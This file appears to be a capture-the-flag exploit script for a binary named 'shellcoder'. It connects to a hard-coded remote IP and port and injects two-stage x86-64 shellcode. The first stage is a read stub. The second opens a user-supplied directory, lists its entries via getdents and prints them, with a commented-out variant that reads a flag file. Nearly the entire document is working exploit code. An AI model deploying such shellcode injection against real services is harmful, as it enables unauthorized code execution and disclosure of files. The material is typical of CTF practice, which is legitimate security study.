#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './shellcoder'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'139.180.215.222', 'port':20002})
env.select()

constants.SYS_memfd_create  = 319
constants.SYS_execveat      = 322
constants.AT_EMPTY_PATH     = 0x1000

#==========

binf = ELF(bin_file)

#==========

def attack(conn, **kwargs):
    shellasm = '''
    xchg rdi, rsi
    mov dh, 0x10
    syscall 
    '''

    conn.sendafter(':', asm(shellasm))

    dirname = raw_input('dirname : ').strip()
    shellasm  = '''
        xor rax,rax
        xor rdi,rdi

        lea rdi, [rip+dirname]
        xor rsi,rsi
        xor rdx,rdx
        inc rax
        inc rax
        syscall

        test rax,rax
        jz error

        mov rdi,rax

        mov dl, 0xfe
        sub rsp,rdx
        mov rsi,rsp
        mov al,78
        syscall

        mov rdx,rax

        xor rax,rax
        inc rax
        inc rax
        inc rax
        syscall

        mov rsi,rsp
        xor rax,rax
        inc rax
        xor rdi,rdi
        inc rdi
        syscall

        add rsp,rdx

    error:
        xor rax,rax
        mov al,60
        xor rdi,rdi
        syscall

    dirname:
        .string "{}"
    '''.format(dirname)
    """
    shellasm  = shellcraft.cat('./flag/rrfh/lmc5/nswv/1rdr/zkz1/pim9/flag')
    """
    conn.send('\x00'*7 + asm(shellasm))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
